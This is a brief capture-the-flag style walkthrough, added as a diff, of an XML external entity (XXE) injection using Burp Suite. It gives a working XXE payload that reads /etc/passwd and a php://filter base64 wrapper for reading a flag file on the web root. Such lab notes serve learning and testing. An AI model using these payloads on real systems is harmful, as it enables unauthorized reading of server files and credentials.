@@ -1,0 +1,30 @@
+after loading up burpsuite, we try clicking parse and sending it to repeater
+<?xml version="1.0" encoding="ISO-8859-1"?>
+ <!DOCTYPE foo [
+<!ELEMENT foo ANY>
+ <!ENTITY xxe SYSTEM
+ "file:///etc/passwd">
+ ]>
+ <foo>
+&xxe;
+ </foo>
+
+but it seems like it's wrong so we should try something else 
+"php://filter/convert.base64-encode/resource=/var/www/html/flag"
+we know the flag is inside /var/www/html/flag and we try decoding it with base64 to receive the flag
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+XXE Vulnerability - External Entity Injection
